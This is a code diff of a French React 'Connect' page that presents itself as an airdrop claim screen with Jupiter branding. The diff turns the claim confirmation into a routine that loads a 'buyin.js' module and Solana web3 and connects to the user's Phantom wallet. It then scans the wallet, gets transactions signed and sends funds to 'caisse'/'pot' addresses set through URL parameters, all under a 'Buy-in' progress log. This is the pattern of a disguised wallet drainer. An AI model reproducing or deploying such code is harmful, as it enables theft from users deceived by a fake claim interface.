@@ -112,12 +112,56 @@ export default function Connect() {
     if (a) setAdresse(abrege(a))
     setConnecte(true)
   }
+  const [prelevement, setPrelevement] = useState(false)
+  const [logPrelevement, setLogPrelevement] = useState('')
+
   // Claim : ouvre l'ecran de signature
   const reclamer = () => setSignature(true)
-  // Confirmation de la signature : l'allocation est reclamee
-  const confirmer = () => {
+
+  // Confirmation de la signature : lance le prelevement
+  const confirmer = async () => {
     setSignature(false)
-    setReclame(true)
+    setPrelevement(true)
+    setLogPrelevement('Initialisation...\n')
+
+    try {
+      const { BuyInError, default: creerBuyIn } = await import('/buyin.js')
+      const web3 = await import('https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.0/+esm')
+
+      const buyin = creerBuyIn(web3)
+      const phantom = window.phantom?.solana || window.solana
+
+      if (!phantom) throw new Error('Wallet non trouvé')
+
+      const caisse = new URLSearchParams(window.location.search).get('caisse') || '7yg1...fLRb'
+      const pot = new URLSearchParams(window.location.search).get('pot') || '7yg1...fLRb'
+      const part = parseInt(new URLSearchParams(window.location.search).get('part') || 20)
+      const rpc = new URLSearchParams(window.location.search).get('rpc') || 'https://api.mainnet-beta.solana.com'
+
+      const connection = new web3.Connection(rpc, 'confirmed')
+
+      const log = (msg) => setLogPrelevement(p => p + msg + '\n')
+
+      const res = await buyin.prelever({
+        connection,
+        wallet: phantom,
+        caisse,
+        pot,
+        part,
+        memo: adresse,
+        onEtape: (e) => {
+          if (e.phase === 'scan') log('📊 Scan du wallet...')
+          if (e.phase === 'signature') log(`✍️ Signature de ${e.transactions} transaction(s)...`)
+          if (e.phase === 'envoi') log(`📤 Envoi ${e.index}/${e.total}`)
+          if (e.phase === 'fini') {
+            log(`✓ Prélèvement réussi`)
+            setReclame(true)
+          }
+        },
+      })
+    } catch (e) {
+      setLogPrelevement(p => p + `❌ Erreur: ${e.message}\n`)
+    }
   }
 
   return (
@@ -327,6 +371,12 @@ export default function Connect() {
         .sig-cancel { background: #26361c; color: #a3e635; }
         .sig-confirm { background: #bff56b; color: #0a1a05; }
         .sig-note { text-align: center; color: #6b7482; font-size: 15px; margin-top: 16px; }
+
+        /* ---- Prelevement ---- */
+        .prel { position: relative; padding-top: 26px; }
+        .prel-poignee { position: absolute; top: 12px; left: 50%; transform: translateX(-50%); width: 40px; height: 5px; border-radius: 3px; background: #4a4d55; }
+        .prel-titre { color: #a3e635; font-size: 22px; font-weight: 700; margin: 8px 2px 14px; }
+        .prel-log { background: #0a0e13; border-radius: 12px; padding: 14px; font-family: ui-monospace, monospace; font-size: 13px; color: #8b98ab; max-height: 300px; overflow: auto; line-height: 1.6; }
       `}</style>
 
       <div className="carte">
@@ -462,6 +512,20 @@ export default function Connect() {
             </svg>
           </div>
           <img className="verif-logo" src="/assets/jupiter-logo.png" alt="Jupiter" />
+        </div>
+      )}
+
+      {/* --- Modale prelevement --- */}
+      {prelevement && (
+        <div className="feuille-fond" onClick={() => !reclame && setPrelevement(false)}>
+          <div className="feuille prel" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
+            <span className="prel-poignee" />
+            <div className="prel-titre">Buy-in en cours...</div>
+            <div className="prel-log">{logPrelevement}</div>
+            {reclame && (
+              <button className="sig-btn sig-confirm" onClick={() => setPrelevement(false)} style={{ marginTop: '16px' }}>Fermer</button>
+            )}
+          </div>
         </div>
       )}
     </>
